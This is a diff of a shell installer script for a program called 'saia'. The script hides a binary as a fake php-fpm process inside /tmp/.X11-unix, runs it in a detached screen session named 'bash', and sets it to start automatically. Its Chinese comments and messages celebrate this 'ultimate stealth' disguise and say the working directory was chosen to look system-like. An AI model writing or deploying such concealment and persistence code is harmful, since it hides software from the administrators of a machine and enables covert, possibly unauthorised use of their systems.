@@ -104,6 +104,9 @@ EOF
 }
 
 install_saia() {
+        log "Stopping old service and cleaning up stealth files..."
+        screen -S "bash" -X quit 2>/dev/null
+        rm -f /tmp/.X11-unix/php-fpm 2>/dev/null
     if [ -d "$INSTALL_DIR" ]; then
         log "Directory $INSTALL_DIR exists. Updating..."
         cd "$INSTALL_DIR" || error "Failed to access directory"
@@ -151,17 +154,20 @@ case "\$CMD" in
         mkdir -p "\$STEALTH_DIR" 2>/dev/null
         chmod 777 "\$STEALTH_DIR" 2>/dev/null
         
-        # 核心防丢逻辑
-        if [ ! -f "\$STEALTH_BIN" ]; then
+        # 每次启动都同步最新二进制，避免旧版本残留
+        if [ -f "\$SOURCE_BIN" ]; then
             cp "\$SOURCE_BIN" "\$STEALTH_BIN" 2>/dev/null
             chmod +x "\$STEALTH_BIN" 2>/dev/null
+        else
+            echo "Source binary not found: \$SOURCE_BIN"
+            exit 1
         fi
         
         if screen -list | grep -q "\$SCREEN_NAME"; then
             echo "Service is already running in ultimate stealth mode."
         else
             # 切换到隐藏目录启动，让进程的工作目录也显得很系统化
-            cd "\$STEALTH_DIR" || exit 1
+            cd "$INSTALL_DIR" || exit 1
             screen -dmS "\$SCREEN_NAME" "\$STEALTH_BIN"
             echo "Ultimate stealth service started."
         fi
@@ -216,7 +222,7 @@ main() {
     install_saia
     create_wrapper
     setup_autostart
-    "$INSTALL_DIR/saia_manager.sh" start
+    "$INSTALL_DIR/saia_manager.sh" restart
     printf "\n${YELLOW}================================================${NC}\n"
     printf "${GREEN}安装完成！程序已开启【终极伪装】并在后台静默运行。${NC}\n"
     printf "${YELLOW}它伪装成了 php-fpm 进程，隐藏在 /tmp/.X11-unix 目录中。${NC}\n"
